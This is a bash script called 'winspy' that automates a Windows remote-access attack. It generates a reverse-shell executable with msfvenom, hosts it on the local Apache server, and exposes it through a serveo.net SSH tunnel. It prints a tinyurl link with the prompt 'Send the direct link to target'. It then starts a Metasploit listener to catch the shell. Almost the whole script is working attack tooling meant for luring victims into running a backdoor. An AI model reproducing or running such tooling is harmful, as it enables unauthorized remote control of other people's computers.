#!/bin/bash
#Colors
white="\033[1;37m"
grey="\033[0;37m"
purple="\033[0;35m"
red="\033[1;31m"
green="\033[1;32m"
yellow="\033[1;33m"
Purple="\033[0;35m"
Cyan="\033[0;36m"
Cafe="\033[0;33m"
Fiuscha="\033[0;35m"
blue="\033[1;34m"
nc="\e[0m"
#
a1="1"
a2="2"
root="r00t"
winspy="TunisianEagles"
prog="winspy"
y="Y"
n="n"
#ROOT PRIVILEGIES
if [[ $EUID -ne 0 ]]; then
        echo -e "$yellow[!]$white execute program as root $yellow[!]$nc"
        exit 1
fi
function banner() {
clear
echo -e "$red	         _________ _        _______  _______          "
echo "	|\     /|\__   __/( (    /|(  ____ \(  ____ )|\     /|"
echo "	| )   ( |   ) (   |  \  ( || (    \/| (    )|( \   / )"
echo "	| | _ | |   | |   |   \ | || (_____ | (____)| \ (_) / "
echo "	| |( )| |   | |   | (\ \) |(_____  )|  _____)  \   /  "
echo "	| || || |   | |   | | \   |      ) || (         ) (   "
echo "	| () () |___) (___| )  \  |/\____) || )         | |   "
echo -e "	(_______)\_______/|/    )_)\_______)|/          \_/   $nc"  
echo ""
echo -e "   	   	$Cyan         Author:$green @Belahsan_Ouerghi\e[0m$nc\n"
echo -e  "	      	\e[101m[+] Facebook : fb.com/ouerghi.belahsan   [+]\e[0m"
echo -e  "	      	\e[101m[+] Email: TunisianEagles@protonmail.com [+]\e[0m\n"
	}
function back() {
echo ""
echo -e " $red[$green$a1$red]$white Back To Main Menu$nc"
echo -e " $red[$green$a2$red]$white Close The Program$nc"
echo ""
read -p "$(echo -e $purple┌─$yellow[$green$root$red@$green$winspy$nc$yellow]$purple─$yellow[$red$prog$yellow]$nc)
$(echo -e $purple└──╼$white $ $nc) " back
if [ $back = "1" ]; then
banner
payload
server
startlist
elif [ $back = "2" ]; then
echo ""
echo -e " $yellow[!]$Cyan Program Closed$nc"
else
echo ""
echo -e " $yellow[!]$red 404 NOT FOUND$nc"
fi
	}
function startlist() {
	echo ""
read -p "$(echo -e $white Do you wanna Start a listenner $red[$green$y$white/$green$n$red]$white : $nc)" listen
if [ $listen = "y" ]; then
echo -e "use exploit/multi/handler\nset PAYLOAD windows/shell/reverse_tcp\nset LHOST $lhost\nset LPORT $lport\nexploit" > listener.rc
echo ""
msfconsole -r listener.rc
elif [ $listen = "Y" ]; then
echo -e "use exploit/multi/handler\nset PAYLOAD windows/shell/reverse_tcp\nset LHOST $lhost\nset LPORT $lport\nexploit" > listener.rc
echo ""
msfconsole -r listener.rc
else
back
fi 
	}
function msf() {
	echo ""
read -p "$(echo -e $white Do you wanna install metasploit$nc) $(echo -e $red[$green$y$white/$green$n$red]$nc ) : " metasploit
if [ $metasploit = "Y" ]; then
echo -e "$red[$green!$red]$yellow Installing Metasploit ...$nc"
sleep 1
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > metasploit_installer && chmod 755 metasploit_installer && ./metasploit_installer
echo -e "$red[$green*$red]$yellow Metasploit installed ...$nc"
sleep 1
clear
elif [ $metasploit = "y" ]; then
echo -e "$red[$green!$red]$yellow Installing Metasploit ...$nc"
sleep 1
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > metasploit_installer && chmod 755 metasploit_installer && ./metasploit_installer
echo -e "$red[$green*$red]$yellow Metasploit installed ...$nc"
sleep 1
clear
elif [ $metasploit = "yes" ]; then
echo -e "$red[$green!$red]$yellow Installing Metasploit ...$nc"
sleep 1
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > metasploit_installer && chmod 755 metasploit_installer && ./metasploit_installer
echo -e "$red[$green*$red]$yellow Metasploit installed ...$nc"
sleep 1
clear
fi
function server() {
service apache2 start
whiptail --title "WARNING" --msgbox "Don't close xterm !!" 8 78
	sleep 2
	xterm -e "ssh -R 80:localhost:80 `echo -n $(date) | md5sum | cut -c1-8`@serveo.net 2> /dev/null > link.log" &
	sleep 7
link=$(grep -o "https://[0-9a-z]*\.serveo.net" link.log)
echo -e " $red[$green*$red]$yellow Send the direct link to target : $link/$payload_name.exe$nc"
tinyurl=$(curl -s http://tinyurl.com/api-create.php?url=$link/$payload_name.exe | head -n1)
echo -e " $red[$green*$red]$yellow Send Link To Target using tinyurl : $tinyurl$nc"
	}
}
function payload() {
clear
banner
echo ""
read -p "$(echo -e $green Enter LHOST : $nc)" lhost
echo " LHOST => $lhost"
read -p "$(echo -e $green Enter LPORT : $nc)" lport
echo " LPORT => $lport"
read -p "$(echo -e $green  Payload Name : $nc)" payload_name
echo " Payload Name => $payload_name"
msfvenom -p windows/shell/reverse_tcp LHOST=$lhost LPORT=$lport -f exe > $payload_name.exe 2> /dev/null
sudo cp -r $payload_name.exe /var/www/html
echo ""
echo -e "$Cyan╔───────────────────────────────────────╗$nc"
echo -e "$Cyan│$nc $red[$green+$red]$green Payload Successfuly Generated $red[$green+$red]$Cyan │$nc"
echo -e "$Cyan┖───────────────────────────────────────┙$nc\n"
sleep 3
	}
banner
msf
payload
server
startlist
